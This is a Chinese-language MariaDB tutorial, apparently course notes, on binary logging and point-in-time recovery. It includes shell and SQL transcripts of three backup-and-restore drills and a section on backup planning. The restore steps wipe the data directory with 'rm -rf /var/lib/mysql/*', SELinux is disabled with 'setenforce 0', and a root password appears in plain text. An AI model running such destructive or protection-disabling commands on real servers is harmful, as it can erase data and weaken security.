/var/lib/mysqltotal 28688drwx------. 2 root root 32 Sep 1 14:14 db1drwx------. 2 root root 32 Sep 1 14:14 db2-rw-r-----. 1 root root 18874368 Sep 1 14:14 ibdata1-rw-r-----. 1 root root 5242880 Sep 1 14:14 ib_logfile0-rw-r-----. 1 root root 5242880 Sep 1 14:14 ib_logfile1drwx------. 2 root root 4096 Sep 1 14:14 mysqldrwx------. 2 root root 4096 Sep 1 14:14 performance_schemadrwx------. 2 root root 19 Sep 1 14:14 test-rw-r-----. 1 root root 41 Sep 1 14:14 xtrabackup_binlog_pos_innodb-rw-r-----. 1 root root 550 Sep 1 14:14 xtrabackup_info[root@mastera0 mysql]# chown mysql. /var/lib/mysql -R[root@mastera0 mysql]# ll /var/lib/mysqltotal 28688drwx------. 2 mysql mysql 32 Sep 1 14:14 db1drwx------. 2 mysql mysql 32 Sep 1 14:14 db2-rw-r-----. 1 mysql mysql 18874368 Sep 1 14:14 ibdata1-rw-r-----. 1 mysql mysql 5242880 Sep 1 14:14 ib_logfile0-rw-r-----. 1 mysql mysql 5242880 Sep 1 14:14 ib_logfile1drwx------. 2 mysql mysql 4096 Sep 1 14:14 mysqldrwx------. 2 mysql mysql 4096 Sep 1 14:14 performance_schemadrwx------. 2 mysql mysql 19 Sep 1 14:14 test-rw-r-----. 1 mysql mysql 41 Sep 1 14:14 xtrabackup_binlog_pos_innodb-rw-r-----. 1 mysql mysql 550 Sep 1 14:14 xtrabackup_info[root@mastera0 mysql]# systemctl start mariadb[root@mastera0 mysql]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+-----+| id |+-----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 || 100 || 101 || 102 || 103 |+-----+16 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye MySQL 日志的分类 日志分类 解释 配置字段 启动日志 排错日志 /var/log/mariadb/mariadb.log 排错的 写日志 二进制日志 默认不打开，记录写操作ddl dcl dml 备份 读日志 慢查询日志 默认不打开，记录读操作dql 性能调优 二进制日志的管理和备份服务器的二进制日志是备份的最重要因素之一。它们对于基于时间点的恢复是必需的，并且通常比数据要小，所以更容易进行频繁的备份。如果有某个时间点的数据备份和所有从那时以后的二进制日志，就可以重放自从上次全备以来的二进制日志并“前滚”所有的变更。 MySQL复制也使用二进制日志。因此备份和恢复的策略经常和复制配置相互影响。 二进制日志很“特别”。如果丢失了数据，你一定不希望同时丢失了二进制日志。为了让这种情况发生的几率减少到最小，可以在不同的卷上保存数据和二进制日志。即使在LVM下生成二进制日志的快照，可以是可以的。为了额外的安全起见，可以将它们保存在SAN上，或用DRBD复制到另外一个设备上。 经常备份二进制日志是个好注意。如果不能承受丢失超过30分钟数据的价值，至少要每30分钟就备份一次。也可以用一个配置--log_slave_update的只读备库，这样可以获得额外的安全性。备库上日志位置与主库不匹配，但找到恢复时正确的位置并不难。最后，从mysql5.6版本开始mysqlbinlog有一个非常方便的特性，可连接到服务器上来实现二进制日志做镜像，比起运行mysqld实例要简单和轻便。它与老版本时向后兼容的。 如何打开二进制日志123451)configure 修改配置文件/etc/my.cnf2)log-bin= 添加二进制日志存放的路径，以及二进制日志的名字log-bin=/var/lib/mysql-log/mastera3)mkdir 创建目录4)UGO,selinux 修改权限mysql:mysql;selinux 允许5)restart mariadb 重启服务 如何查看二进制日志index 日志的索引 000001 日志二进制日志包含一系列的事件。每个事件有一个固定长度的头，其中有各种信息，例如当前时间戳和默认的数据库。可以使用mysqlbinlog工具来查看二进制日志的内容，打印出一些头信息。下面是一个输出的例子。 12345# at 1017#160831 15:09:29 server id 1 end_log_pos 1109 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;insert into db2.t1 values (4),(5)/*!*/; 二进制日志的格式 第一行包含日志文件内的偏移字节值（位置编号position），本例中为1017 第二行包含如下几项： 事件的日期和时间，MySQL会用它们来产生SET TIMESTAMP语句。 原服务器的服务器ID，对于防止复制之间无限循环和其他问题是非常有必要的。 end_log_pos，下一个事件的偏移字节值。该值对一个多语句事务中的大部分事件是不正确的。在此类事务过程中，MySQL的主库会复制事件到一个缓冲区，但这样做的时候它并不知道下个日志事件的位置。 事件类型，本例中的类型为Query，但还有许多不同的类型。 原服务器上执行事件的线程ID，对于审计和执行CONNECTION_ID（）函数很重要。 exec_time，这是语句的时间戳和写入二进制日志的事件只差。不要依赖这个值，因为它可能在复制落后的备库上会有很大的偏差。 在原服务器上事件产生的错误代码。如果事件在备库上重放时导致不同的错误，那么复制将因安全预警而失败。 安全清除二进制日志 需要决定日志的过期策略以防止磁盘被二进制日志写满。日志增长多大取决于负载和日志格式。我们建议，如果可能，只要日志有用就尽可能保留。保留日志对于设置复制、分析服务器负载、审计和从上次全备按时间点进行恢复，都很有帮助。当决定想要保留日志多久时，应该考虑这些需求。 一个常见的设置时使用expire_logs_days变量来告诉MySQL定期清理日志。这个变量直到MySQL4.1才引入，在此之前的版本，必须手动清理二进制日志。在新版本中，用rm删除日志会导致mysqlbin.index状态文件与磁盘上的文件不一致，有些语句，例如show master logs可能会受到影响而失败。手动修改mysqlbin.index文件也不能修复这个问题。应该用类次下面的cron命令。 10 0 * * * /usr/bin/mysql -e &quot;purge master logs before current_date - interval n day&quot; expire_logs_days设置在服务器启动或MySQL切换二进制日志时生效，因此，如果二进制日志从没有增长和切换，服务器不会清除老条目。此设置时通过查看日志的修改时间而不是内容来决定哪个文件需要被清除。 MYSQLBINLOG命令 mysqlbinlog /var/lib/mysql-log/mariadb.000001 –start-datetime=name 起始时间点 –stop-datetime=name 结束时间点 mysqlbinlog –stop-datetime=”2016-08-31 11:19:12” –start-position=pos 位置编号 唯一，增大 at –stop-position=pos 基于二进制日志的实时增量还原 数据库备份恢复模拟一123456789101112131415161718192021 1)11:00 mysqldump db1.t1 1 2 3 4 5 6 2)11:00-12:00 insert 7 8 9 update 1--》10 delete 2 3)12:00 人为误操作 delete db1.t1-------------------------- 恢复数据，还原的标准步骤： 1)停止服务 systemctl stop mariadb 2)清空环境 rm -rf /var/lib/mysql/* 3)启动服务 systemctl start mariadb 4)导入全备份数据 mysql &lt; /tmp/mysql.11.sql 5)刷新授权 &gt; flush privileges; 6)测试，全备份数据是否正确 &gt; select * from db1.t1; 7)查看分析二进制日志---》得到正确的操作命令，跳过错误的 mysqlbinlog /var/lib/mysql-log/master.00000X * 自己记下来，做全备份的时候 * 请别人记，全备份文件 --master-data=2 文件的第22行 分析： * 自己看，用眼睛找 * grep 截取关键字 ，delete drop -B 显示前面的几行 8)导入增量备份 通过管道导入数据库 mysqlbinlog --stop-datetime=&apos;2016-08-31 11:19:12&apos; /var/lib/mysql-log/mastera.000002 | mysql -uroot -puplooking 9)测试，查看增量备份数据是否正确 10)全备份 mysqldump -uroot -puplooking -A --single-transaction --master-data=2 --flush-logs &gt; /tmp/mysql.12.mysql 数据库备份恢复模拟二1234567891011121314151)12:00 mysqldump db1.t1 3 4 5 6 7 8 9 102)12:00-14:00 正常的写：insert db1.t1 11 12 人为误操作 delete from db1.t1; 正常的写： Create database db2; Create table db2.t1 (id int); 人为误操作 Drop table db2.t1;3)14:00 恢复start 开头stop 2016-08-31 13:45:02start 2016-08-31 13:45:10stop 2016-08-31 13:45:42 数据库备份恢复模拟三123456789101)14:00 mysqldump db1.t1 3 4 5 6 7 8 9 10 11 12 db2.t12)14:00-16:00 insert into db1.t1 values (13),(14); delete from db1.t1; insert into db2.t1 values (1),(2),(3); delete from db2.t1; insert into db2.t1 values (4),(5);3)16:00 恢复 start at 245 at 598 at 953 stop at 430 at 785 at 1136 课堂实战5：基于二进制日志时间点和位置的数据库备份恢复模拟123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659# 打开二进制日志 open binlog[root@mastera0 ~]# setenforce 0[root@mastera0 ~]# getenforcePermissive[root@mastera0 ~]# vim /etc/my.cnf[root@mastera0 ~]# mkdir /var/lib/mysql-log[root@mastera0 ~]# chown mysql. /var/lib/mysql-log[root@mastera0 ~]# ll -d /var/lib/mysql-logdrwxr-xr-x. 2 mysql mysql 6 Aug 31 10:33 /var/lib/mysql-log[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# cd /var/lib/mysql-log[root@mastera0 mysql-log]# lltotal 8-rw-rw----. 1 mysql mysql 245 Aug 31 10:35 mastera.000001-rw-rw----. 1 mysql mysql 34 Aug 31 10:35 mastera.index# 执行写操作 ddl dcl dml[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 2Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 1 || 2 |+----+2 rows in set (0.00 sec)MariaDB [(none)]&gt; insert into db1.t1 values (3),(4);Query OK, 2 rows affected (0.04 sec)Records: 2 Duplicates: 0 Warnings: 0MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 1 || 2 || 3 || 4 |+----+4 rows in set (0.00 sec)MariaDB [(none)]&gt; insert into db1.t1 values (5),(6);Query OK, 2 rows affected (0.03 sec)Records: 2 Duplicates: 0 Warnings: 0MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 1 || 2 || 3 || 4 || 5 || 6 |+----+6 rows in set (0.00 sec)# 查看二进制日志 mysqlbinlog[root@mastera0 mysql-log]# mysqlbinlog /var/lib/mysql-log/mastera.000001 |sed &apos;s@\\/\\*.*\\*\\/@@&apos;|sed -n &apos;/BEGIN/,$p&apos;BEGIN;# at 309#160831 10:44:02 server id 1 end_log_pos 401 Query thread_id=2 exec_time=0 error_code=0SET TIMESTAMP=1472611442;insert into db1.t1 values (3),(4);# at 401#160831 10:44:02 server id 1 end_log_pos 428 Xid = 5COMMIT;# at 428#160831 10:44:29 server id 1 end_log_pos 492 Query thread_id=2 exec_time=0 error_code=0SET TIMESTAMP=1472611469;BEGIN;# at 492#160831 10:44:29 server id 1 end_log_pos 584 Query thread_id=2 exec_time=0 error_code=0SET TIMESTAMP=1472611469;insert into db1.t1 values (5),(6);# at 584#160831 10:44:29 server id 1 end_log_pos 611 Xid = 7COMMIT;DELIMITER ;# End of log fileROLLBACK ;;;[root@mastera0 mysql-log]# mysqlbinlog /var/lib/mysql-log/mastera.000001 |sed &apos;s@\\/\\*.*\\*\\/@@&apos;|sed -n &apos;/BEGIN/,$p&apos;|sed -n &apos;/^[^#]/p&apos;BEGIN;SET TIMESTAMP=1472611442;insert into db1.t1 values (3),(4);COMMIT;SET TIMESTAMP=1472611469;BEGIN;SET TIMESTAMP=1472611469;insert into db1.t1 values (5),(6);COMMIT;DELIMITER ;ROLLBACK ;;;---------------------------------------# 数据库备份恢复演习1## 模拟场景### 全备份[root@mastera0 ~]# mysqldump -uroot -puplooking -A --single-transaction --master-data=2 --flush-logs &gt; /tmp/mysql.11.mysql### 模拟正确操作和错误操作MariaDB [(none)]&gt; insert into db1.t1 values (7),(8),(9);Query OK, 3 rows affected (0.04 sec)Records: 3 Duplicates: 0 Warnings: 0MariaDB [(none)]&gt; update db1.t1 set id=10 where id=1;Query OK, 1 row affected (0.04 sec)Rows matched: 1 Changed: 1 Warnings: 0MariaDB [(none)]&gt; delete from db1.t1 where id=2;Query OK, 1 row affected (0.04 sec)MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 |+----+8 rows in set (0.00 sec)MariaDB [(none)]&gt; delete from db1.t1;Query OK, 8 rows affected (0.04 sec)MariaDB [(none)]&gt; select * from db1.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; \\q## 开始恢复数据[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 9Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 |+----+10 rows in set (0.01 sec)MariaDB [(none)]&gt; desc db2.t1;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | NO | PRI | NULL | |+-------+---------+------+-----+---------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; \\qBye## 全备份[root@mastera0 ~]# mysqldump -uroot -puplooking -A --single-transaction --master-data=2 --flush-logs &gt; /tmp/mysql.12.mysql---------------------------------------# 数据库备份恢复演习2## 模拟场景[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 9Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; insert into db1.t1 values (11),(12);Query OK, 2 rows affected (0.04 sec)Records: 2 Duplicates: 0 Warnings: 0MariaDB [(none)]&gt; delete from db1.t1;Query OK, 10 rows affected (0.03 sec)MariaDB [(none)]&gt; create database db2;Query OK, 1 row affected (0.00 sec)MariaDB [(none)]&gt; create table db2.t1 (id int primary key);Query OK, 0 rows affected (0.05 sec)MariaDB [(none)]&gt; drop table db2.t1;Query OK, 0 rows affected (0.03 sec)MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || db1 || db2 || mysql || performance_schema || test |+--------------------+6 rows in set (0.00 sec)MariaDB [(none)]&gt; select * from db1.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;ERROR 1146 (42S02): Table \\&apos;db2.t1\\&apos; doesn\\&apos;t existMariaDB [(none)]&gt; \\qBye## 数据还原[root@mastera0 ~]# systemctl stop mariadb[root@mastera0 ~]# rm -rf /var/lib/mysql/*[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# mysql &lt; /tmp/mysql.12.mysql[root@mastera0 ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 3Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from t1;ERROR 1046 (3D000): No database selectedMariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 |+----+8 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye### 增量备份还原[root@mastera0 mysql-log]# mysqlbinlog --stop-datetime=&apos;2016-08-31 13:45:02&apos; /var/lib/mysql-log/mastera.000006|mysql -uroot -puplooking[root@mastera0 mysql-log]# mysqlbinlog --start-datetime=&apos;2016-08-31 13:45:10&apos; --stop-datetime=&apos;2016-08-31 13:45:42&apos; /var/lib/mysql-log/mastera.000006|mysql -uroot -puplooking### 检测[root@mastera0 mysql-log]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 8Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || db1 || db2 || mysql || performance_schema || test |+--------------------+6 rows in set (0.00 sec)MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 |+----+10 rows in set (0.00 sec)MariaDB [(none)]&gt; use db2;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [db2]&gt; show tables;+---------------+| Tables_in_db2 |+---------------+| t1 |+---------------+1 row in set (0.00 sec)MariaDB [db2]&gt; desc t1;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | NO | PRI | NULL | |+-------+---------+------+-----+---------+-------+1 row in set (0.01 sec)MariaDB [db2]&gt; show table status\\G;*************************** 1. row *************************** Name: t1 Engine: InnoDB Version: 10 Row_format: Compact Rows: 0 Avg_row_length: 0 Data_length: 16384Max_data_length: 0 Index_length: 0 Data_free: 10485760 Auto_increment: NULL Create_time: 2016-08-31 14:56:22 Update_time: NULL Check_time: NULL Collation: latin1_swedish_ci Checksum: NULL Create_options: Comment:1 row in set (0.00 sec)ERROR: No query specifiedMariaDB [db2]&gt; exitBye[root@mastera0 mysql-log]# mysqldump -uroot -puplooking -A --master-data=2 --flush-logs &gt; /tmp/mysql.14.mysql----------------------------------# 数据库备份恢复演习3## 模拟场景[root@mastera0 mysql-log]# vim /tmp/mysql.test.sql[root@mastera0 mysql-log]# cat /tmp/mysql.test.sqlinsert into db1.t1 values (13),(14);delete from db1.t1;insert into db2.t1 values (1),(2),(3);delete from db2.t1;insert into db2.t1 values (4),(5);[root@mastera0 mysql-log]# mysql -uroot -puplooking &lt; /tmp/mysql.test.sql[root@mastera0 mysql-log]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 12Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;+----+| id |+----+| 4 || 5 |+----+2 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye## 数据还原[root@mastera0 ~]# systemctl stop mariadb[root@mastera0 ~]# rm -rf /var/lib/mysql/*[root@mastera0 ~]# systemctl start mariadb[root@mastera0 ~]# mysql &lt; /tmp/mysql.14.mysql[root@mastera0 ~]# mysqlWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 3Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 |+----+10 rows in set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 ~]# sed -n &apos;22p&apos; /tmp/mysql.14.mysql-- CHANGE MASTER TO MASTER_LOG_FILE=&apos;mastera.000015&apos;, MASTER_LOG_POS=245;[root@mastera0 ~]# mysqlbinlog /var/lib/mysql-log/mastera.000015/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=1*/;/*!40019 SET @@session.max_insert_delayed_threads=0*/;/*!50003 SET @OLD_COMPLETION_TYPE=@@COMPLETION_TYPE,COMPLETION_TYPE=0*/;DELIMITER /*!*/;# at 4#160831 15:06:16 server id 1 end_log_pos 245 Start: binlog v 4, server v 5.5.44-MariaDB-log created 160831 15:06:16BINLOG \\&apos;6IHGVw8BAAAA8QAAAPUAAAAAAAQANS41LjQ0LU1hcmlhREItbG9nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzgNAAgAEgAEBAQEEgAA2QAEGggAAAAICAgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKeZqQ==\\&apos;/*!*/;# at 245#160831 15:09:29 server id 1 end_log_pos 309 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;SET @@session.pseudo_thread_id=11/*!*/;SET @@session.foreign_key_checks=1, @@session.sql_auto_is_null=0, @@session.unique_checks=1, @@session.autocommit=1/*!*/;SET @@session.sql_mode=0/*!*/;SET @@session.auto_increment_increment=1, @@session.auto_increment_offset=1/*!*/;/*!\\C utf8 *//*!*/;SET @@session.character_set_client=33,@@session.collation_connection=33,@@session.collation_server=8/*!*/;SET @@session.lc_time_names=0/*!*/;SET @@session.collation_database=DEFAULT/*!*/;BEGIN/*!*/;# at 309#160831 15:09:29 server id 1 end_log_pos 403 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;insert into db1.t1 values (13),(14)/*!*/;# at 403#160831 15:09:29 server id 1 end_log_pos 430 Xid = 646COMMIT/*!*/;# at 430#160831 15:09:29 server id 1 end_log_pos 494 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;BEGIN/*!*/;# at 494#160831 15:09:29 server id 1 end_log_pos 571 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;delete from db1.t1/*!*/;# at 571#160831 15:09:29 server id 1 end_log_pos 598 Xid = 647COMMIT/*!*/;# at 598#160831 15:09:29 server id 1 end_log_pos 662 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;BEGIN/*!*/;# at 662#160831 15:09:29 server id 1 end_log_pos 758 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;insert into db2.t1 values (1),(2),(3)/*!*/;# at 758#160831 15:09:29 server id 1 end_log_pos 785 Xid = 648COMMIT/*!*/;# at 785#160831 15:09:29 server id 1 end_log_pos 849 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;BEGIN/*!*/;# at 849#160831 15:09:29 server id 1 end_log_pos 926 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;delete from db2.t1/*!*/;# at 926#160831 15:09:29 server id 1 end_log_pos 953 Xid = 649COMMIT/*!*/;# at 953#160831 15:09:29 server id 1 end_log_pos 1017 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;BEGIN/*!*/;# at 1017#160831 15:09:29 server id 1 end_log_pos 1109 Query thread_id=11 exec_time=0 error_code=0SET TIMESTAMP=1472627369/*!*/;insert into db2.t1 values (4),(5)/*!*/;# at 1109#160831 15:09:29 server id 1 end_log_pos 1136 Xid = 650COMMIT/*!*/;# at 1136#160831 15:10:32 server id 1 end_log_pos 1155 StopDELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/;[root@mastera0 ~]#[root@mastera0 ~]# mysqlbinlog --start-position=245 --stop-position=430 /var/lib/mysql-log/mastera.000015|mysql -uroot -puplooking[root@mastera0 ~]# mysqlbinlog --start-position=598 --stop-position=785 /var/lib/mysql-log/mastera.000015|mysql -uroot -puplooking[root@mastera0 ~]# mysqlbinlog --start-position=953 --stop-position=1136 /var/lib/mysql-log/mastera.000015|mysql -uroot -puplooking[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 8Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;+----+| id |+----+| 3 || 4 || 5 || 6 || 7 || 8 || 9 || 10 || 11 || 12 || 13 || 14 |+----+12 rows in set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;+----+| id |+----+| 1 || 2 || 3 || 4 || 5 |+----+5 rows in set (0.00 sec)MariaDB [(none)]&gt; \\q[root@mastera0 mysql-log]# vim /tmp/mysql.test.sql[root@mastera0 mysql-log]# cat /tmp/mysql.test.sqlinsert into db1.t1 values (13),(14);delete from db1.t1;insert into db2.t1 values (1),(2),(3);delete from db2.t1;insert into db2.t1 values (4),(5);[root@mastera0 mysql-log]# mysql -uroot -puplooking &lt; /tmp/mysql.test.sql[root@mastera0 mysql-log]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 12Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; select * from db1.t1;Empty set (0.00 sec)MariaDB [(none)]&gt; select * from db2.t1;+----+| id |+----+| 4 || 5 |+----+2 rows in set (0.00 sec)MariaDB [(none)]&gt; \\qBye[root@mastera0 mysql-log]# mysqldump -uroot -puplooking -A --master-data=2 --flush-logs &gt; /tmp/mysql.16.mysql 设计 MySQL 备份计划备份MySQL比看起来难。最基本的，备份仅是数据的一个副本，但是受限于应用程序的要求、MySQL的存储引擎架构，以及系统配置等因素，会让复制一份数据变得困难。 在生产实践中，对于大数据库来说，物理备份是必须的：逻辑备份太慢并受到资源限制，从逻辑备份中恢复需要很长时间。基于快照备份，例如Percona XtraBackup和MySQL Enterprise Backup是最好的选择。对于较小的数据库，逻辑备份可以很好的胜任。 保留多个备份集。 定期从逻辑备份或者物理备份中抽取数据进行恢复测试。 保存二进制日至用于基于故障时间点的恢复。expire_logs_days参数应该设置得足够长，至少可以从最近两次物理备份中作基于时间点的恢复，这样就可以在保持主库运行且不应用任何二进制日志的情况下创建一个备库。备份二进制日至与国旗设置无关，二进制日志备份需要保存足够长的时间，以便能够从最近的逻辑备份进行恢复。 完全不借助备份工具本身来监控备份和备份的过程。需要另外验证备份是否正常。 通过演练整个恢复过程来测试备份和恢复。测算恢复所需要的资源（CPU、磁盘空间、实际时间，以及网络带宽等）。 对安全性要仔细考虑。如果有人能够接触生产服务器，他是否也能访问备份服务器？反过来呢？ 一般来说，能承受的数据丢失越多，备份越简单。如果有非常严苛的需求，要确保能恢复所有数据，备份就很困难。基于故障时间点的恢复也有几类。一个“宽松”的故障时间点恢复需求意味着需要重建数据，知道“足够接近”问题发生的时刻。一个“硬性”的需求意味着不能容忍丢失任何一个已提交的事务，即使某些可怕的事情发生（例如服务器着火了）。这需要特别的技术，例如二进制日至保存在一个独立的的SAN卷或使用DRBD磁盘复制。 接下来你还要考虑 在线（热）备份还是离线（冷）备份，又或者温备份？ 逻辑备份还是物理备份？ 备份什么？ 存储引擎和一致性？ 在规划备份时，有一些与性能相关的因素需要考虑。 锁时间：需要持有锁多长时间，例如在备份期间持有的全局 flush tables with read lock? 备份时间：复制备份到目的地需要多久？ 备份负载：在复制备份到目的地时对服务器性能的影响有多少？ 恢复时间：把备份镜像从存储位置复制到MySQL服务器，重放二进制日志等，需要多久？ 